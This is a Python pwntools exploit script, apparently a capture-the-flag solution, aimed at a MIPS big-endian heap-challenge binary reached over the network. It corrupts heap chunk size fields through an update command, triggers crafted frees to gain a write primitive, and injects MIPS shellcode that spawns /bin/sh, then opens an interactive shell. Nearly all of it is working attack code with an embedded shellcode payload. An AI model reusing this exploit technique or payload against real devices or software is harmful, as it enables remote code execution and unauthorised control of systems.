from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

def update(p,idx,size,content):
	sla(p,'Command: ',str(1))
	sla(p,'Index: ',str(idx))
	sla(p,'Size: ',str(size))
	sla(p,'Content: ',str(content))

def get_chunk_size(size):
	if size%4==0:
		if size%8==0:
			size = size+4
		else:
			pass
	else:
		size = size+4-size%4
		if size%8==0:
			size = size+4
	if size <= 8:
		size = 12
	return size

def delete(p,idx):
	sla(p,'Index: ',str(idx))

def pwn():
	DEBUG = 0
	ATTACH = 0
	context.arch = 'mips'
	context.endian = 'big'
	BIN_PATH = './embedded_heap'
	elf = ELF(BIN_PATH)
	context.terminal = ['tmux', 'split', '-h']
	if DEBUG == 1:
		p = process(BIN_PATH)
		context.log_level = 'debug'
		if context.arch == 'amd64':
			libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else:
			libc = ELF('/lib/i386-linux-gnu/libc.so.6')
			
	else:
		p = remote('192.168.122.12',9999)
		# libc = ELF('./libc_32.so.6')
		context.log_level = 'debug'
	# 0x555555554000
	if ATTACH==1:
		gdb.attach(p,'''
		b *0x80486f8
		b *0x80488c9
		''')
	ru(p,'Chunk[0]: ')
	ck0_size = int(ru(p,' ')[:-1])
	ck0_size = get_chunk_size(ck0_size)
	ru(p,'Chunk[2]: ')
	ck2_size = int(ru(p,' ')[:-1])
	ck2_size = get_chunk_size(ck2_size)
	log.info('chunk 0 size: '+str(ck0_size))
	log.info('chunk 1 size: '+str(ck2_size))
	# modify size to 8+1, prepare for first free
	payload = 'a'*ck0_size+p32(8+1)+p32(0)+p32(0x11)+p32(0)[:-1]
	update(p,0,ck0_size+0x10,payload)
	# modify size to 0x305d8+1, prepare for second free
	payload = 'a'*ck2_size+p32(0x305d9)+p32(0)*2+p32(0)[:-1]
	update(p,2,ck2_size+0x10,payload)
	# pwn
	sla(p,'Command: ',str(3))
	delete(p,1)

	sla(p,'Index: ',str(3))
	buf =  ""
	buf += "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27"
	buf += "\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4"
	buf += "\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f"
	buf += "\xab\x01\x01\x01\x0c\x2f\x62\x69\x6e\x2f\x73\x68\x00"
	sla(p,'Index: ',str(2))
	sla(p,'Size: ',str(ck2_size+0xa0))
	payload = 'a'*(ck2_size-4)+buf.ljust(0xa0+4,'\xaa')
	sa(p,'Content: ',payload)

	p.interactive()

if __name__ == '__main__':
	pwn()
